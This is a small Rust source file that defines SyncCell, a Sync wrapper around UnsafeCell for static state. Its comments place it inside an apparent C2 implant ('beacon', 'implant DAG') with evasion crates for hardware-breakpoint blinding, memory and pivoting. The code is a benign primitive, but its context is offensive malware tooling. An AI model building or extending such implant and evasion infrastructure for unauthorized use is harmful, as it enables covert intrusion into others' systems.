//! Minimal `Sync`-capable cell for single-threaded beacon statics.
//!
//! `core::cell::SyncUnsafeCell` is the std type for this, but it is unstable
//! on older pinned nightlies (`sync_unsafe_cell` feature). This newtype
//! provides the same contract — a `static` cell that is `Sync` because every
//! access is confined to the single-threaded beacon context — without
//! depending on toolchain version. Mirrors the pattern proven in
//! `blind_hwbp.rs` (CRITICAL-6 fix).
//!
//! # Safety contract
//! Callers must guarantee single-threaded access (beacon bootstrap/loop) or
//! provide their own happens-before edge (e.g. an `AtomicU8` init flag with
//! Acquire/Release ordering). The wrapper itself provides no synchronization.
//!
//! NOTE (WP-C crate split): `SyncCell` is `pub` because statics typed on it
//! live in sibling crates of the implant DAG (evasion `blind`/`mem`, tasks
//! `pivot`/`task_guard`). The single-threaded-beacon contract above is
//! therefore a CROSS-CRATE API contract — every consumer crate must uphold it.

pub struct SyncCell<T>(core::cell::UnsafeCell<T>);

// SAFETY: see module docs — all access is single-threaded beacon context or
// externally synchronized via atomics.
unsafe impl<T> Sync for SyncCell<T> {}

impl<T> SyncCell<T> {
    pub const fn new(value: T) -> Self {
        Self(core::cell::UnsafeCell::new(value))
    }

    pub fn get(&self) -> *mut T {
        self.0.get()
    }
}
